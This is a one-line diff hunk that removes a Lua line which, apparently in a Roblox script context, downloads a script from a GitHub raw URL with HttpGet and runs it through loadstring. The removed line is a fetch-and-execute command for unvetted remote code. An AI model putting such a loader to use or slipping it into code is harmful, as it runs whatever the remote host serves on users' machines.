@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/max2007killer/kak_Dobatit/main/out.lua"), true))()
